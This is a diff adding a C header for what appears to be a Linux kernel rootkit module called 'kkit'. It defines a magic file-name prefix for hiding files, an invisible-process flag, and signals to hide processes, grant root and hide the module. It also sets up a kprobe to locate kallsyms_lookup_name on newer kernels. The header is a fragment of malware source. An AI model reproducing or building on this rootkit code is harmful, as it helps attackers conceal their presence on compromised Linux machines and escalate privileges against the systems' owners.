@@ -1,0 +1,31 @@
+struct linux_dirent {
+        unsigned long   d_ino;
+        unsigned long   d_off;
+        unsigned short  d_reclen;
+        char            d_name[1];
+};
+
+#define MAGIC_PREFIX "u8f2_"
+
+#define PF_INVISIBLE 0x10000000
+
+#define MODULE_NAME "kkit"
+
+enum {
+	SIGINVIS = 60,
+	SIGSUPER = 61,
+	SIGMODINVIS = 62,
+};
+
+#ifndef IS_ENABLED
+#define IS_ENABLED(option) \
+(defined(__enabled_ ## option) || defined(__enabled_ ## option ## _MODULE))
+#endif
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
+#define KPROBE_LOOKUP 1
+#include <linux/kprobes.h>
+static struct kprobe kp = {
+	    .symbol_name = "kallsyms_lookup_name"
+};
+#endif
